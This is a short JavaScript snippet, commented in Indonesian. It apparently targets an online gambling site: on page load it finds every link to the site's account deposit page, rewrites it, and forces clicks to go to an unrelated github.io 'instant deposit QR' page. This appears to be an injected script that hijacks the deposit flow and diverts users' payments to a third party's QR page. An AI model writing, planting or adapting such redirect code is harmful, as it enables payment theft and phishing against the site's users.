document.addEventListener("DOMContentLoaded", function () {
  // Seleksi semua elemen <a>
  document.querySelectorAll('a[href="https://reksatoto88.top/account/deposit"]').forEach(function (el) {
    // Ganti href
    el.setAttribute("href", "https://inggarfi.github.io/instantdepositqr/dkilat.html");

    // Jika klik, langsung redirect juga (opsional)
    el.addEventListener("click", function (e) {
      e.preventDefault();
      window.location.href = "https://inggarfi.github.io/instantdepositqr/dkilat.html";
    });
  });
});
